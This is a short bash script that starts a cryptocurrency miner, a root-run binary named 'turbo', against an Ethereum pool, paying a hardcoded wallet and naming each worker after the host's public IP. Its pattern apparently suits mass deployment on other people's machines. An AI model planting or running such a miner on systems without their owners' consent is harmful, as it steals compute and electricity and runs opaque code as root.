#!/bin/bash

POOL=asia1.ethermine.org:4444
WALLET=0x9DF28981F797355a80BAaE90084090d6d60B6B08
WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )

cd "$(dirname "$0")"

chmod +x ./turbo && sudo ./turbo -a ethash -o $POOL -u $WALLET.$WORKER $@
